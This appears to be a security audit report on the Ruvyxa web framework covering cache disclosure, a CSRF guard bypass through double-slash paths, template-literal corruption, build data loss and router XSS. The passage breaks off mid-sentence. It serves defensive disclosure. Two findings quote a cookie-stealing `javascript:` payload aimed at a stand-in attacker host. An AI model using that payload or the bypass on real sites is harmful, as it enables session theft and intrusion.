# Ruvyxa — System Audit Report

**Date:** 2026-08-29 **Scope:** whole repository — 86,943 lines of Rust across 7 crates, 44,348
lines of JavaScript and TypeScript across 25 packages, plus `scripts/`, `templates/`, and CI.
**Method:** 14 independent read-only audits, one per subsystem, with non-overlapping file ownership.
Findings were merged, de-duplicated, and re-ranked across subsystems afterwards. **Working tree:**
unmodified. This phase changed no source file.

---

## Executive summary

141 findings: **5 Critical, 18 High, 56 Medium, 62 Low.** 138 are CONFIRMED — read end to end in the
code, with a quoted line and a named mechanism. 3 are SPECULATIVE and say what would settle them.

The codebase is, on the whole, carefully built. Several defect classes I went looking for are
genuinely closed and are worth stating so the next audit does not re-derive them: **path traversal**
is closed on every file-serving path (single decode per segment, then a canonicalised prefix compare
on both sides); **script-tag injection** is closed (`safe_json_for_script` escapes `<`, `>`, `&`,
U+2028/9, so both `</script>` and the `<!--<script>` double-escape state are neutralised); there is
**no JWT anywhere in the tree**, so the whole algorithm-confusion class is inapplicable;
`@ruvyxa/database` **constructs no SQL at all**; session tokens are 32 CSPRNG bytes with HMAC'd
store keys, making lookup constant-time by construction; OAuth uses PKCE S256 with single-use
cookie-bound state; and build output is **deterministic** — no map iteration, timestamp, absolute
path, or completion order was found deciding emitted code bytes.

What the audit did find has a shape, and the shape is the repository's own documented trap list.
Nine of the ten traps in `AGENTS.md` fired somewhere:

| Trap                             | Fired                                | Findings                                                                               |
| -------------------------------- | ------------------------------------ | -------------------------------------------------------------------------------------- |
| Two module graphs                | yes, three times                     | `BUNF-02`, `BUNF-04`, `GMDT-02`                                                        |
| Two request hosts                | yes, eight times                     | `RTMS-01`, `RTMS-02`, `RTMS-04`, `RTMS-05`, `DEVR-02`, `DEVR-11`, `CORE-01`, `CORE-03` |
| One source scanner per language  | yes, three times                     | `RTMC-01`, `CLIC-11`, `GMDT-04`                                                        |
| Derived cache identity           | yes, twice                           | `BUNB-04`, `SEC-04`                                                                    |
| Ordering is a contract           | once, narrow                         | `RTMC-08`                                                                              |
| Windows paths                    | no instance found                    | —                                                                                      |
| Line-based linkers               | yes, three times                     | `BUNB-01`, `BUNB-02`, `RTMC-02`, `RTMC-03`                                             |
| Registration lists               | no — verified complete and gated     | —                                                                                      |
| Prerender fail-soft vs fail-hard | correct; a third copy exists ungated | `CLIB-06`                                                                              |
| Generated-source templates       | closed since the last audit          | —                                                                                      |

Three cross-cutting themes account for most of the severity:

1. **A rule that exists on one host and not the other.** The Axum host serves `dev` and `start`;
   `createHandler` serves every deployed build; the standalone server is a third. A guard, a header,
   a limit, or a resolution rule added to one has repeatedly not reached the others. The endpoint
   conformance fixture exists to prevent this and describes _which endpoints exist_, not _what
   policy they carry_ — so it cannot see any of these.
2. **Client identity is decided four different ways.** `GMDT-01`, `CORE-01`, and `ADP-01` are three
   independent defects in the same decision, and all three end at the same place: per-client rate
   limiting that is not per-client.
3. **A gate that looks like it covers something and does not.** `DEP-01`, `CLIC-01`, `SEC-03`,
   `SEC-04`, `CLIB-06`, `DEVR-01`, and `CORE-03` are each a case where a test, fixture, or checker
   exists, passes, and structurally cannot observe the defect. Two of them (`SEC-03`, `SEC-04`) have
   tests that _assert the defective behaviour_.

## Coverage

| #   | Subsystem                                                  | Prefix  | Findings | C / H / M / L        |
| --- | ---------------------------------------------------------- | ------- | -------- | -------------------- |
| 1   | Bundler front-end — `ast.rs`, `compiler.rs`, `resolver.rs` | `BUNF`  | 9        | 0 / 2 / 4 / 3        |
| 2   | Bundler back-end — `linker.rs`, minifier, output, caches   | `BUNB`  | 7        | 0 / 2 / 3 / 2        |
| 3   | Dev/prod server request path (Axum)                        | `DEVR`  | 11       | 0 / 1 / 5 / 5        |
| 4   | Render workers, pipeline, cache, watcher                   | `DEVC`  | 10       | 0 / 2 / 3 / 5        |
| 5   | Static assets, documents, CSS, images                      | `ASSET` | 12       | 0 / 0 / 5 / 7        |
| 6   | CLI build, prerender, artifact cache                       | `CLIB`  | 9        | 1 / 0 / 5 / 3        |
| 7   | CLI commands, config, discovery, tooling                   | `CLIC`  | 11       | 0 / 1 / 3 / 7        |
| 8   | Route graph, middleware, diagnostics, TUI                  | `GMDT`  | 13       | 0 / 3 / 5 / 5        |
| 9   | JS runtime compiler half                                   | `RTMC`  | 7        | 1 / 2 / 2 / 2        |
| 10  | JS runtime server half                                     | `RTMS`  | 9        | 2 / 0 / 4 / 3        |
| 11  | `@ruvyxa/core`, react, testing                             | `CORE`  | 11       | 1 / 1 / 5 / 4        |
| 12  | auth, database, realtime, plugins                          | `SEC`   | 11       | 0 / 1 / 6 / 4        |
| 13  | 11 deploy adapters, scaffolding, templates                 | `ADP`   | 6        | 0 / 2 / 1 / 3        |
| 14  | Dependencies, scripts, CI, repo gates                      | `DEP`   | 15       | 0 / 1 / 5 / 9        |
|     | **Total**                                                  |         | **141**  | **5 / 18 / 56 / 62** |

Two findings were merged across subsystems and carry both original IDs: `RTMC-01` (the regex-blind
tokenizer, reported independently as `BUNF-03` in Rust) and `CLIC-01` (the `image.maxWidth` config
divergence, reported independently as `RTMC-05` from the JavaScript side).

### What was not reached

- **Nothing was executed.** No `cargo build`, `cargo test`, `pnpm test`, or `pnpm build` was run, to
  keep the tree byte-identical while 14 agents read it concurrently. Every finding is static; each
  names the concrete step that would reproduce it.
- **Advisory status of specific dependencies** is unverified — no `cargo audit` or `pnpm audit` was
  run, and no CVE is asserted anywhere in this report. What _is_ verified from the lockfiles: no
  git-URL, tarball, or non-registry resolution; no `postinstall` in any workspace package.
- **Emitted vendor config could not be checked against live platform documentation** (no network).
  Claims about how a platform behaves are marked and say what would confirm them.
- **Realtime/collab server-side per-message authorization.** The client half is in
  `@ruvyxa/realtime`; the server half is a Rust native capability. `DEVR-04` covers its transport
  bound, but connect-time and per-message authorization were not audited end to end.
- **Browser-observable behaviour.** `CORE-11` and the framing consequence of `CORE-06` need a real
  browser or client; both say so.

---

# Critical

Five findings. The bar applied: silent corruption of data the user owns, loss of data already
written, disclosure of one user's data to another, or a remotely reachable bypass of a security
control the framework advertises.

---

### RUV-C1 — A render that read cookies, headers, or draft mode is served to a shared CDN as publicly cacheable

- **Severity:** Critical
- **Category:** Security — cross-user data disclosure
- **Subsystem:** JS runtime server half (`RTMS-02`); the native host shares the omission
- **Affected files:** `packages/ruvyxa/runtime/serverless-handler.mjs:1336`, `:1484`, `:1253`,
  `:1298`, `:285`; `crates/ruvyxa_dev_server/src/render_pipeline.rs:441`
- **Confidence:** CONFIRMED — verified directly against the source during merge
- **Evidence:** `renderPage` computes the flag correctly and nothing consumes it for the header:

  ```js
  // serverless-handler.mjs:1484
  response.requestScoped = usedRequestContext(context)

  // serverless-handler.mjs:1341 — the header is set without consulting it
  if (rendered.status !== 200 || rendered.headers.has('cache-control')) return rendered
  rendered.headers.set(
    'cache-control',
    documentCacheControl(route.render.strategy, route.render.revalidate),
  )
  ```

  `grep` for `requestScoped` returns lines 1250, 1253, 1298, 1406, 1441, 1471, 1484 — **every read
  is a store decision.** For `isr` the emitted header is
  `public, max-age=0, s-maxage=<window>, stale-while-revalidate=<up to a year>`.

- **Reproduction path:** An `isr` page that calls `cookies()` or `draftMode()`, deployed behind any
  CDN-fronted adapter, requested when nothing is stored for that path. The response carries the
  visitor's personalised HTML and a `public` shared-cache directive. The edge stores it and serves
  it to everyone asking for that URL.
- **Root cause:** `requestScoped` is treated as an input to "may I store this in the _adapter's_
  cache?" and never as an input to "what may I tell a _shared_ cache about this?" They are the same
  decision — `documentCacheControl` describes the route, `requestScoped` describes this response,
  and the response has to win. The comment at `:1248` states the hazard in exactly those words for
  the store and stops there.
- **Impact:** One visitor's personalised document served to every subsequent visitor of that URL.
  The draft-mode case is sharpest: `draftMode()` exists to show unpublished content to an authorised
  previewer, and its own docstring at `packages/@ruvyxa/core/src/server.ts:873` promises "a request
  in draft mode is never served from a static or incrementally regenerated cache." The response it
  produces is advertised to the CDN as reusable for up to a year.
- **Recommended fix:** In `handlePage` (`serverless-handler.mjs:1336`), send `no-store` when
  `rendered.requestScoped` is true regardless of strategy — mirroring the `formData` branch at
  `:1372`, which already does exactly this. Apply the same one-line guard to
  `insert_document_cache_control`'s caller in `render_pipeline.rs`.
- **Regression risk:** An ISR route that reads `headers()` on every request (an A/B bucket, say)
  stops being CDN-cacheable. That is correct — it was never safe to cache — but it shows up as an
  origin-load increase and deserves a release note. It cannot break correctness: `no-store` is
  strictly stricter.
- **Required tests:** `tests/packages/ruvyxa/serverless-handler.test.mjs` — for each of `ssg`,
  `csr`, `isr`, a handler whose render calls `cookies()`, asserting the response carries `no-store`
  and no `s-maxage`, and that `writePrerendered` was not called. Pin both halves together.

---

### RUV-C2 — Plugin HTTP hooks match the raw pathname while routing matches the canonical one, so `//api/x` slips past every path-scoped guard

- **Severity:** Critical
- **Category:** Security — CSRF / authorization bypass
- **Subsystem:** JS runtime server half (`RTMS-01`); the native host has the same split
- **Affected files:** `packages/ruvyxa/runtime/plugin-http.mjs:347`, `:357`, `:160`, `:177`, `:204`;
  `packages/ruvyxa/runtime/serverless-handler.mjs:571`, `:633`;
  `packages/ruvyxa/runtime/route-match.mjs:128`; `crates/ruvyxa_dev_server/src/lib.rs:1719`, `:1761`
- **Confidence:** CONFIRMED — reproduced by the auditing agent, and re-verified during merge
- **Evidence:** Two answers to "what is this request's path":

  ```js
  // plugin-http.mjs:357 — what the plugin stage compares against
  export function decodedRequestPathname(request) {
    const pathname = new URL(request.url).pathname
    try {
      return decodeURIComponent(pathname)
    } catch {
      return pathname
    }
  }
  ```

  `canonicalRoutePath` (`route-match.mjs:128`) splits on `/`, applies `filter(Boolean)`, and
  re-joins — so `//api/users` collapses to `/api/users` and `/admin/` to `/admin`.
  `decodedRequestPathname` does not. Driving the two against each other:

  ```
  "//api/users" | guard sees "//api/users" | /api/* match = false | routes to "/api/users"
  "/admin/"     | guard sees "/admin/"     | /admin  match = false | routes to "/admin"
  ```

- **Reproduction path:** A project that enables the first-party CSRF guard — `originGuard()` in
  `packages/ruvyxa/src/plugins/http.ts:743`, default `routes: ['/api/*']` — is protected on
  `POST /api/users` and **not** on `POST //api/users`, which reaches the same handler. A cross-site
  `<form method="POST" action="https://victim.example//api/users">` produces exactly that request
  target, and `SameSite=Lax` still sends the session cookie with it.
- **Root cause:** The plugin stage compares patterns against the whole-path `decodeURIComponent`;
  the router compares against `canonicalRoutePath`, which normalises segment structure. Any request
  whose raw path differs from its canonical path — a duplicated slash anywhere, a trailing slash
  against an exact pattern — is matched by the router and missed by the guard. The native host has
  the same split: it canonicalises into `request_path` (`lib.rs:1719`) and hands the plugin the raw
  `request_target` (`lib.rs:1761`).
- **Impact:** Every path-scoped `http.onRequest` hook is a bypassable guard. That includes
  `originGuard` (CSRF on `app/api/` routes), any project middleware written as an auth check with a
  `match` list — the shape `@ruvyxa/auth` and the plugin docs both encourage — and the scoped
  `securityHeaders`/`headers` response hooks, which silently stop applying to the same URLs. No
  special client is needed: a plain cross-site form or `curl` sends the double slash.
- **Recommended fix:** In `plugin-http.mjs`, make `decodedRequestPathname` return the canonical form
  by importing `canonicalRoutePath` from `./route-match.mjs` (already carried in
  `HANDLER_RUNTIME_FILES` and already copied beside `plugin-http.mjs` in every function bundle),
  falling back to the raw pathname when it returns `null`. Apply at both call sites (`:159`, `:204`)
  and to the `entry.path !== pathname` comparison at `:161`. Mirror in `lib.rs:1761` so the native
  host hands the plugin the canonical path.
- **Regression risk:** A hook currently matching a trailing-slash URL through `'/x/*'` starts also
  matching the canonical `/x` — a widening, and the correct behaviour. A hook that deliberately
  distinguished `/a/` from `/a` would change, but no first-party plugin does and the router never
  made that distinction.
- **Required tests:** A table in `tests/fixtures/` replaying
  `['/api/users', '//api/users', '/api//users', '/admin', '/admin/', '//admin']` through both
  `matchesPatterns(decodedRequestPathname(...))` and `canonicalRoutePath(...)`, asserting the two
  agree on whether the request is in scope — replayed by `plugins.test.mjs` and by
  `plugin_bridge.rs`'s suite, because both hosts share the seam.

---

### RUV-C3 — `export default` of a multi-line template literal injects a `;` into the string

- **Severity:** Critical
- **Category:** Reliability — silent data corruption
- **Subsystem:** JS runtime compiler half (`RTMC-03`)
- **Affected files:** `packages/ruvyxa/runtime/compiler.mjs:2094`, `:2318`
- **Confidence:** CONFIRMED — reproduced by the auditing agent through the real linker
- **Evidence:**

  ```js
  // compiler.mjs:2318 — completeness decided by bracket depth alone
  function isBalancedDefaultExpression(lines) {
    const expression = lines.join('\n').replace(/^export\s+default\s+/, '')
    let depth = 0
    for (const char of expression) {
      if (char === '(' || char === '{' || char === '[') depth += 1
      else if (char === ')' || char === '}' || char === ']') depth -= 1
    }
    return depth <= 0
  }
  ```

  A template literal contributes no bracket depth, so the collector stops after line 0 and emits
  `__exports.default = <line 0>;` — with the template still open, the `;` lands **inside the
  string**. Observed:

  ```
  expected "line one\n  indented two\nline three"
  got      "line one;\n    indented two\n  line three"
  ```

- **Reproduction path:** A dependency or project module whose default export is a multi-line
  template literal, bundled and then read back. Reproduced above through
  `compileBundleWithMetadata`. A multi-line tagged template behaves the same.
- **Root cause:** Three compounding mistakes in one rewriter: completeness is decided by bracket
  depth over masked text, so an open template reads as balanced; `collectedRaw` stores
  `sourceLines[n].trim()`, stripping the author's indentation; and the statement is emitted with a
  trailing `;` that lands inside the still-open literal. The remaining lines then fall through as
  pass-through text and are swallowed by the unterminated backtick, so the module still parses and
  the corruption is silent.
- **Impact:** Any module whose default export is or contains a multi-line template literal — a
  default-exported prompt, SQL statement, CSS block, mail template, config blob — ships a different
  string than its source, with a character the author never wrote inserted into it. No diagnostic;
  `assertLinkedSyntax` passes because the result is valid JavaScript.
- **Recommended fix:** In `compiler.mjs`, give the default-export collector the treatment the clause
  collector already has (`gatherClauseStatement`/`isCompleteClauseStatement`, `:2281-2316`): decide
  completeness by asking whether the **masked** text still has an open template or string —
  `maskNonCode` already computes that — join **untrimmed** raw lines, and place the `;` after the
  real end of the expression. Emit the expression as its own multi-line block. Fix with RUV-H11,
  which otherwise re-corrupts the same lines.
- **Regression risk:** Joining untrimmed raw lines changes emitted whitespace for every multi-line
  `export default`, so golden-output assertions move once.
  `tests/fixtures/module-syntax-conformance.json` already covers the object-literal and arrow cases
  by value, which guards the semantics.
- **Required tests:** Add to `tests/fixtures/module-syntax-conformance.json`: `export default` of a
  multi-line template literal, of a multi-line tagged template, and of an object holding one — each
  asserting the exact string via `JSON.stringify(...)`, so both the injected `;` and the indentation
  shift fail. That fixture is replayed by `module-syntax.test.mjs`, which **executes** its output,
  which is the right shape.

---

### RUV-C4 — A build killed during the output commit wipes `dist/` and strands the previous build in an unrecoverable directory

- **Severity:** Critical
- **Category:** Reliability — data loss
- **Subsystem:** CLI build pipeline (`CLIB-01`)
- **Affected files:** `crates/ruvyxa_cli/src/build_output.rs:87`, `:126`, `:73`;
  `crates/ruvyxa_cli/src/build.rs:8`, `:141`
- **Confidence:** CONFIRMED — verified directly against the source during merge
- **Evidence:** The commit is a two-phase move whose rollback exists only for a returned `Err`:

  ```rust
  // build_output.rs:87
  let backup_dir = create_build_temp_dir(out_dir, ".build-rollback")?;
  let moved_existing = match move_named_build_outputs(out_dir, &backup_dir) { ... };
  let commit_result = move_named_build_outputs(staging_dir, out_dir);
  ```

  A killed process never runs the rollback arm. The module contract claims the opposite:

  ```rust
  // build.rs:8
  //! ... so a failed or interrupted build leaves the previous `dist/` intact
  ```

- **Reproduction path:** Run `ruvyxa build` and `SIGKILL` (or close the terminal) between the two
  `move_named_build_outputs` calls — a window widened on Windows by `rename_with_windows_retry`,
  which sleeps up to 375 ms _per name_ on a `PermissionDenied` from an indexer or scanner. `dist/`
  then contains none of the eight named outputs, and `dist/.build-rollback-<pid>-<nanos>/` holds the
  previous build.
- **Root cause:** No crash-visible journal, and nothing on the next build looks for a stranded
  rollback directory — `create_build_temp_dir` only removes the one exact directory it is about to
  create, so a directory from a dead process is never seen again. `BuildStagingCleanup::drop` does
  not help: `Drop` does not run on `SIGKILL`, and `ruvyxa_cli` installs no Ctrl-C handler.
- **Impact:** A self-hosted deployment served by `ruvyxa start` from `dist/` goes down and stays
  down after an interrupted rebuild, with the previous good output present on disk but unreachable
  and never cleaned. On CI, a rebuild plus unbounded disk growth: every killed build leaves a full
  copy of the previous output plus a partial staging tree inside `dist/`, and nothing removes
  either.
- **Recommended fix:** In `build_output.rs`, sweep `out_dir` for `.build-staging-*` and
  `.build-rollback-*` at the start of `commit_staged_build_outputs`, and for a rollback directory
  whose named outputs are absent from `out_dir`, **restore from it before deleting**. Write a marker
  file into the rollback directory naming the outputs it holds so recovery does not have to guess.
  Deleting a stale directory unconditionally is the wrong fix — that is what makes the loss
  permanent.
- **Regression risk:** A sweep must not delete a concurrent build's staging tree. Key the "is this
  mine to clean" test on the recorded pid being dead, not on age. Two `ruvyxa build` invocations
  against one `dist/` already race today and this must not make that worse.
- **Required tests:** In `crates/ruvyxa_cli/src/tests.rs`, beside
  `staged_build_commit_replaces_outputs_and_preserves_cache_directory`: simulate an interrupted
  commit by calling `move_named_build_outputs(out_dir, &backup)` directly, then assert the next
  `commit_staged_build_outputs` restores `out_dir` rather than leaving it empty; plus a test that a
  stale `.build-rollback-*` from another pid is removed.

---

### RUV-C5 — `router.navigate()` hands an unvalidated href to `window.location.assign`, so a `javascript:` URL from data executes

- **Severity:** Critical
- **Category:** Security — stored/reflected XSS
- **Subsystem:** `@ruvyxa/react` client router (`CORE-02`)
- **Affected files:** `packages/@ruvyxa/react/src/router.ts:751`, `:226`;
  `packages/@ruvyxa/react/src/route-context.ts:117`; `packages/@ruvyxa/react/src/route-types.ts:84`,
  `:109`
- **Confidence:** CONFIRMED
- **Evidence:** The function has already parsed the URL and already decided it is not http/https,
  and then discards that knowledge:

  ```ts
  // router.ts:747-755
  const url = resolveInternalUrl(href)
  if (!url) {
    if (typeof window !== 'undefined') window.location.assign(href) // the raw string
    return
  }

  // router.ts:226-237
  if (url.protocol !== 'http:' && url.protocol !== 'https:') return null
  ```

  Every other call site uses the parsed value (`hardNavigate` → `location.assign(url.href)`), so
  this is the one place an unvalidated string reaches a navigation sink. The public API funnels
  runtime data into it: `useRouter().push` is a thin wrapper (`route-context.ts:117`), the type
  admits any scheme (`ExternalHref = \`${string}:${string}\` |
  ...`), and the documented escape hatch `route(href: string)` **asserts rather than validates**,
  using a CMS field as its own example.

- **Reproduction path:** Render `<button onClick={() => useRouter().push(route(post.url))}>` where
  `post.url` is `javascript:fetch('https://attacker.example/'+document.cookie)`.
  `resolveInternalUrl` returns `null` (a `javascript:` URL has origin `"null"`), and
  `window.location.assign` on a `javascript:` URL executes it in the current document in Chrome,
  Firefox, and Safari.
- **Root cause:** The fall-through was written for legitimate cases — cross-origin links, `mailto:`,
  `tel:`, downloads — and expresses "not mine, give it to the browser" by replaying the caller's raw
  string. For an `<a>` click that matches what the browser would have done anyway, but
  `useRouter().push()` is a **new sink**: without the router there is no way for a page to turn a
  data string into a navigation, and the framework's own typing tells authors this is supported.
- **Impact:** XSS in any application that navigates to a URL it did not author — a CMS link field, a
  `?next=` return parameter, a search result, a user profile URL. The framework ships no CSP by
  default (`DEFAULT_SECURITY_HEADERS` has no `Content-Security-Policy`), so nothing else blocks it.
- **Recommended fix:** In `router.ts`, have `resolveInternalUrl` return a discriminated result
  (`{ kind: 'internal' | 'external', url } | { kind: 'refused' }`) and in `navigate` call
  `location.assign(url.href)` — the parsed value — only for an allow-listed scheme set (`http:`,
  `https:`, `mailto:`, `tel:`, `sms:`, and same-page `#`). Refuse anything else with a
  `console.error` and an early return. Apply the same guard at the top of `prefetch` (`:891`).
- **Regression risk:** An application relying on `router.push('mailto:…')` or a custom scheme
  (`web+foo:`, an app deep link) stops working unless the allow-list covers it, so the allow-list
  should be generous and the refusal loud.

  **Correction (found while fixing this, 2026-08-29).** This entry originally said `<Link>` was
  unaffected. That was **wrong**: `packages/@ruvyxa/react/src/link.tsx:146` calls
  `event.preventDefault()` _before_ `router.navigate()`, so on a plain left-click the browser's own
  handling is suppressed first and the router then refuses — leaving the link doing nothing at all.
  `shouldLetBrowserHandle` had to learn to classify the href before preventing the default. Fixed in
  the same session; see also `RUV-H19` below, a residual sink the same investigation exposed.

- **Required tests:** `packages/@ruvyxa/react/test/router.test.mjs` already stubs
  `window.location.assign`. Add a case asserting
  `router.navigate('javascript:globalThis.__pwned=1')` records **no** `assign` call, and a companion
  asserting `router.navigate('mailto:a@b.c')` still does.

---

# High

Twenty-one findings. Security controls that do not hold, build failures on legal input, and silently
wrong output.

---

### RUV-H21 — Neither scanner records JSX text, so a decorator stripper deletes an `@` the page renders

- **Severity:** High · **Category:** Reliability (one source scanner per language) · **Subsystem:**
  `ruvyxa_bundler` · `packages/ruvyxa/runtime`
- **Added:** 2026-08-30, found while levelling `BUNF-09`'s third copy of the decorator rule. Not
  present in the original audit; raised here because it is silent deletion of rendered content,
  which is not the Low its neighbours are.
- **Affected files:** `crates/ruvyxa_bundler/src/ast.rs` (`scan_code`, `mask_range`,
  `ModuleAst::text_spans`), `crates/ruvyxa_bundler/src/compiler.rs` (`strip_decorators_with_plan`),
  `packages/ruvyxa/runtime/scanner.mjs` (`maskRange`), `packages/ruvyxa/runtime/compiler.mjs`
  (`stripDecorators`)
- **Confidence:** CONFIRMED — both halves reproduced end to end before the fix.
  `strip_decorators_with_plan("export const el = <p>write to @support</p>\n", plan)` returned
  `"export const el = <p>write to </p>\n"`, and the same source compiled through
  `compileBundleWithMetadata` with the pre-change `scanner.mjs` emitted the same loss.
- **Evidence:** `ModuleAst::text_spans` records string bodies, comments, regular expressions, and
  template text. JSX children are on neither list, so they are a code position. `@` is not a
  JavaScript operator, so a code-position `@` begins a decorator wherever placement allows one — and
  `ast::decorator_can_start` allows one after an alphanumeric, because a class field written without
  a semicolon puts an alphanumeric before a real decorator on the next line through ASI, and
  `@First @Second class S {}` puts one there on the same line. In `write to @support` the `@`
  follows `o`. `parse_module` therefore reports `has_decorators`, and the stripper deletes
  `@support` and everything identifier-shaped after it.
- **Reproduction path:** Put `<p>write to @support</p>` in any `.tsx` page and run `ruvyxa build`.
  `compile_source` parses every module and hands the plan to `transform_with_plan`, so this is the
  path every build takes — the plan-less pre-filter that masked it in `strip_decorators`'s own tests
  never runs. The rendered page reads `write to `.
- **Root cause:** Named trap #3 — one source scanner per language — with a construct neither of them
  knew. The two scanners agreed with each other, which is why nothing downstream could notice:
  `is_code_offset` and `masked_code` are both derived from the same walk, so a wrong answer is
  internally consistent.
- **Impact:** Silent removal of text from a rendered page, in the browser bundle and in every server
  render, for any `@` in JSX children preceded by an identifier character — handles (`ping @ops`),
  addresses written as prose, decorator syntax shown in documentation pages, npm scopes named in
  copy. The output still parses and the build still succeeds, so nothing reports it. The same
  blindness also made a `{ … }` container's contents reachable only by accident: the brace matcher
  read the `/` of a nested `</li>` as a regular-expression opener, because the token before it is
  `<`.
- **Recommended fix:** Teach both scanners a JSX element walk that records children and quoted
  attribute values as text while `{ … }` containers stay code, held level by a shared fixture. Bias
  the walk toward declining: reading code as text is the silent direction — it drops an import from
  the module graph and stops the linker rewriting an `export` it has already bundled — so an element
  the walk cannot read through to its close must be declined and scanned as before. A generic arrow
  such as `<T extends object>(x: T) => x` is exactly that case.
- **Regression risk:** The whole of it is in the declined direction. Entering text mode where code
  was intended is the expensive mistake, so the entry test is the value-expected test that already
  separates a regular expression from a division — which keeps `foo<Bar>(x)` and
  `new Map<string, number>()` out — and the element must close before any span is recorded. A raw
  `<` in JSX children is deliberately not handled; JSX rejects it too, so such a file never
  compiled.
- **Required tests:** JSX cases in `tests/fixtures/source-scanner-conformance.json`, replayed by
  `ast.rs`'s `masking_matches_the_shared_conformance_table` and by
  `tests/packages/ruvyxa/source-scanner.test.mjs`: children of elements and fragments, nesting,
  apostrophes in text, containers holding an `import()`, comment containers, a closing tag inside a
  container, attribute values against attribute expressions, self-closing tags, a type-argument
  list, a comparison, a generic arrow, and the declined raw `<`. Plus the erased-syntax half — the
  JSX sources in `decorators.untouched`, replayed through `strip_decorators_with_plan` in Rust and
  through a real `.tsx` compile in `tests/packages/ruvyxa/erased-syntax.test.mjs` — and a Rust test
  asserting a container's `import()`, `require()`, and `process.env` read still reach the AST.
- **Status:** Fixed 2026-08-30 in this change.

---

### RUV-H20 — Route discovery accepts a dynamic segment the route matcher treats as static, so `[post-id]` 404s on every host

- **Severity:** High · **Category:** Reliability (two module graphs) · **Subsystem:** `ruvyxa_graph`
  - `@ruvyxa/core`
- **Added:** 2026-08-29, found while fixing `ADP-03`. Not present in the original audit.
- **Affected files:** `crates/ruvyxa_graph/src/lib.rs:1337` (`validate_dynamic_name`),
  `packages/@ruvyxa/core/src/route-match.ts:110` (`compilePattern`), and the generated
  `packages/ruvyxa/runtime/route-match.mjs`
- **Confidence:** CONFIRMED — verified by driving the matcher directly:
  `createCanonicalRouteMatcher([{ path: '/blog/[post-id]' }])('/blog/hello')` returns `null`.
- **Evidence:** `validate_dynamic_name` accepts a hyphen in a dynamic segment name, so
  `app/blog/[post-id]/page.tsx` is discovered as a dynamic route and written into the manifest.
  `compilePattern` matches `^\[(\w+)\]$` — and `\w` excludes `-` — so the same segment fails that
  test and is compiled as a **literal** `[post-id]` path component.
- **Reproduction path:** Create `app/blog/[post-id]/page.tsx`, run `ruvyxa build`, request
  `/blog/hello`. Route discovery reports the route; the matcher never matches it; the request 404s.
  The only URL that would match is the literal `/blog/[post-id]`.
- **Root cause:** Two descriptions of "what is a dynamic segment name", in two languages, with
  nothing holding them level — the repository's named trap #1, in a place the resolution fixtures do
  not reach because they cover _module_ resolution, not _route_ pattern syntax.
- **Impact:** A route that passes `ruvyxa check`, appears in the route table, and is unreachable in
  every host — dev, start, and every deployed build. Silent: no diagnostic fires, because each half
  believes it is behaving correctly. `ADP-03`'s fix now inherits the same restriction, so such an
  app's ISR expansions also fall to the default revalidate window.
- **Recommended fix:** Decide the character set once and write it into a shared fixture both sides
  replay. The narrow fix is to widen `compilePattern` to match what discovery accepts; the safer one
  is to narrow `validate_dynamic_name` and emit a diagnostic naming the offending folder, so an
  author learns at build time instead of getting a 404. **Either way both halves must land in the
  same change** — widening one alone converts a silent 404 into a host divergence.
- **Regression risk:** Narrowing discovery breaks any project already using a hyphenated segment
  name — which is currently broken anyway, but would newly fail the build rather than 404 at request
  time. That is the better failure, and it belongs in the changelog.
- **Required tests:** A `tests/fixtures/route-pattern-conformance.json` listing accepted and
  rejected dynamic segment names, replayed by `validate_dynamic_name` in Rust and by
  `compilePattern` in TypeScript. Cases: `[id]`, `[postId]`, `[post_id]`, `[post-id]`, `[...slug]`,
  `[[...slug]]`, `[post.id]`.

---

### RUV-H19 — `<Link>` renders an unsanitized `href` into the anchor, so a `javascript:` URL from data executes on a plain click

- **Severity:** High · **Category:** Security · **Subsystem:** `@ruvyxa/react`
- **Added:** 2026-08-29, found while fixing `RUV-C5`. Not present in the original audit.
- **Affected files:** `packages/@ruvyxa/react/src/link.tsx`
- **Confidence:** CONFIRMED
- **Evidence:** `RUV-C5` closed the _imperative_ sink — `router.push()` / `navigate()` no longer
  replay an arbitrary scheme into `window.location.assign`. But `<Link href={…}>` renders the raw
  href into the `<a>` element, and after the `RUV-C5` fix a left-click on an out-of-allow-list
  scheme is deliberately handed back to the browser. So `<Link href={route(record.url)}>` with a
  `javascript:` URL executes on click, on middle-click, and before hydration.
- **Reproduction path:** Render `<Link href={route(post.url)}>` where `post.url` is
  `javascript:fetch('https://attacker.example/'+document.cookie)` and click it.
- **Root cause:** The anchor is the sink, and nothing sanitizes what goes into it. This is _not_ a
  regression from `RUV-C5` — the same href reached the browser before that fix too, and a plain
  `<a href>` behaves identically. It is a pre-existing hole that the `RUV-C5` investigation exposed
  and that the framework is well placed to close, because `route()`'s own docstring invites a
  data-derived string and the framework ships no CSP by default.
- **Impact:** Stored XSS in any application that renders a link URL it did not author — the same CMS
  link field, `?next=` parameter, or user profile URL as `RUV-C5`, through the declarative API
  rather than the imperative one. The imperative sink is closed; this one is not.
- **Recommended fix:** In `link.tsx`, refuse the executable schemes — `javascript:` and `vbscript:`
  — when rendering the `href` attribute: omit the attribute rather than substituting `#`, so the
  anchor is honestly inert, and warn once per href in development. Read the scheme with the URL
  parser rather than matching text, because only the parser agrees with the browser that
  `"  JaV\tascRipt:alert(1)"` is a `javascript:` URL. Do **not** reuse `classifyNavigationTarget` —
  despite what this finding said when it was filed, that classifier answers a different question
  ("may the _router_ navigate here?") and refuses `web+foo:`, `ircs:`, and app deep links, every one
  of which is a legitimate anchor the browser hands to a registered handler. Do **not** refuse
  `mailto:`/`tel:`/`sms:`/`blob:`/cross-origin `https:` either.
  - **Correction, `data:`.** This finding named `data:` flatly alongside the two executable schemes,
    and that was wrong. Every current engine has blocked top-level `data:` navigation since 2017
    (Chrome 60, Firefox 59), so a `data:text/html` URL in an anchor `href` cannot become a document
    and cannot run its script — refusing it buys no security. What it does break is
    `<Link href="data:text/csv;charset=utf-8,…" download="report.csv">`, the ordinary way an
    application hands a visitor a generated file. `data:` is therefore refused only when the link
    carries **no** `download` attribute, where the honest report is "this link would do nothing";
    with a `download` it renders. `download` does **not** relax `javascript:` or `vbscript:`, which
    execute on Enter and on a middle-click whatever the attribute says. The click handler already
    reads `download` the same way — a `download` anchor is a file transfer, never a navigation.
- **Regression risk:** An application deliberately rendering a `javascript:` href through `<Link>`
  breaks. That is the intent, and a plain `<a>` remains available for anyone who genuinely wants it.
  A `data:` href used as a destination becomes inert; one used with `download` is unaffected.
- **Required tests:** `packages/@ruvyxa/react/test/link.test.mjs` — assert the rendered anchor for a
  `javascript:` href carries no executable `href`, that `mailto:` and cross-origin `https:` are
  rendered unchanged, that a `data:` href **with** a `download` renders and the same href
